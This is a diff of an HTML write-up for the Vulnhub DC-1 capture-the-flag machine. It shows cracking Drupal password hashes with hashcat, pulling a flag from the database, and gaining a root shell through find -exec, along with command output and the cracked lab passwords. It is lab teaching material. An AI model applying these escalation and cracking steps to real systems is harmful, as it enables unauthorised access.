@@ -224,7 +224,7 @@ www-data@DC-1:/var/www$
 					      'prefix' => '',
 </code></pre>
 			<br>
-			<p>I took a look through the DrupalDB and found hashed passwords for the Admin and a user named Fred. I fired up Hashcat and decided to get it cracking while I took a look around the host. The hashcat mode for durpal passwords is 1800.</p>
+			<p>I took a look through the DrupalDB and found hashed passwords for the Admin and a user named Fred. I fired up Hashcat and start cracking the drupal passwords. Some research turns up that the hashcat mode for durpal passwords is 1800.</p>
 			<br>
 <pre><code class="language-none">
 	www-data@DC-1:/var/www$ mysql -u dbuser -p
@@ -360,7 +360,7 @@ www-data@DC-1:/var/www$
 </code></pre>
 		<br>
 		<p>Hashcat finished cracking the admin and Fred password. The admin's password is MyPassword and Fred's is 53cr3t. But for some reason I couldn't log in via a browser. Maybe I broke Drupal with the drupalgeddon2 exploit?
-			After consulting Google I found Drupal stores it's content in <code>nodes</code> and the body of the text is stored in the field_data_body table.. and that's where we find the third flag:<p>
+			After consulting Google I found Drupal stores it's content in <code>nodes</code> and the body of the text is stored in the <code>field_data_body</code> table.. and that's where we find the third flag:<p>
 		<br>
 		<pre><code class="language-none">
 			mysql> select * from node;
@@ -382,7 +382,73 @@ www-data@DC-1:/var/www$
 			+------------------------------------------------------------------------------------------------------------------------------+
 			1 row in set (0.00 sec)
 </code></pre>
-		<p>Thanks to @abatchy for a good challenge, and @g0tmi1k for hosting on Vulnhub! </p>
+<br>
+<p>This seems to suggest we may be able to <code>FIND</code> the next flag...</p>
+<br>
+<pre><code class="language-none">
+	www-data@DC-1:/$ find -name flag*
+	find -name flag*
+	./home/flag4
+	./home/flag4/flag4.txt
+	./var/www/flag1.txt
+	./usr/src/linux-headers-3.2.0-6-686-pae/include/config/zone/dma/flag.h
+	./usr/share/doc/tk8.5/examples/images/flagdown.xbm
+	./usr/share/doc/tk8.5/examples/images/flagup.xbm
+	./usr/include/X11/bitmaps/flagdown
+	./usr/include/X11/bitmaps/flagup
+	./usr/lib/gcc-4.9-backport/lib/gcc/i486-linux-gnu/4.9/plugin/include/flags.h
+	./usr/lib/gcc-4.9-backport/lib/gcc/i486-linux-gnu/4.9/plugin/include/flag-types.h
+	./usr/lib/perl/5.14.2/auto/POSIX/SigAction/flags.al
+	./sys/devices/virtual/net/lo/flags
+	./sys/devices/pci0000:00/0000:00:11.0/0000:02:01.0/net/eth0/flags
+	www-data@DC-1:/$ cat /home/flag4/flag4.txt
+	cat /home/flag4/flag4.txt
+	Can you use this same method to find or access the flag in root?
+
+	Probably. But perhaps it's not that easy.  Or maybe it is?
+
+</code></pre>
+<br>
+<p>Looks like there is a user named Flag4. The hint seems to suggest there may be something else we can do with the <code>FIND</code> command. Looking at the manual for <code>FIND</code> returns that we can actually execute commands. This makes the hint in flag3 make more sense...</p>
+<br>
+<pre><code class="language-none">
+	www-data@DC-1:/$ find . -exec 'bin/bash' \;
+	find . -exec 'bin/bash' \;
+	bash-4.2$ whoami
+	whoami
+	www-data
+	bash-4.2$ find . -exec '/bin/sh' \;
+	find . -exec '/bin/sh' \;
+	# whoami
+	whoami
+	root
+	# cd ..
+	cd ..
+	# ls
+	ls
+	bin   home	      lib64	  opt	sbin	 tmp	  vmlinuz.old
+	boot  initrd.img      lost+found  proc	selinux  usr
+	dev   initrd.img.old  media	  root	srv	 var
+	etc   lib	      mnt	  run	sys	 vmlinuz
+	# cd root
+	cd root
+	# ls
+	ls
+	thefinalflag.txt
+	# cat thefinalflag.txt
+	cat thefinalflag.txt
+	Well done!!!!
+
+	Hopefully you've enjoyed this and learned some new skills.
+
+	You can let me know what you thought of this little journey
+	by contacting me via Twitter - @DCAU7
+</code></pre>
+<br>
+<p>And that looks like the last flag. Now that we have root I decieded to crack the Flag4 user's password. Hashcat says it's <code>orange</code>.
+<br>
+
+		<p>Thanks to @DCAU7 for a good challenge, and @g0tmi1k for hosting on Vulnhub! </p>
     	<br>
 	    </div>
 	  </div>
